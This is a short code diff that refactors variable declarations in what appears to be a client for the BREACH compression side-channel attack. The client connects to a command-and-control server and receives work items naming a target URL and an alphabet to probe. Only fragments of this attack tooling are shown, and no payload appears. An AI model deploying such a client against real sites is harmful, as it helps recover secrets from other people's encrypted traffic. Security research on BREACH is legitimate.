@@ -2,12 +2,12 @@ const io = require('socket.io-client'),
       req = require('./request.js'),
       config = require('./config.js');
 
-var BREACHClient = {
+const BREACHClient = {
     ONE_REQUEST_TIMEOUT: 5000,
     MORE_WORK_TIMEOUT: 10000,
     _socket: null,
     init() {
-        var flag = 0;
+        let flag = 0;
         this._socket = io.connect(config.COMMAND_CONTROL_URL);
         this._socket.on('connect', () => {
             console.log('Connected');
@@ -45,7 +45,7 @@ var BREACHClient = {
         }
     },
     doWork(work) {
-        var {url, amount, alignmentalphabet} = work;
+        const {url, amount, alignmentalphabet} = work;
 
         // TODO: rate limiting
         if (typeof url == 'undefined') {
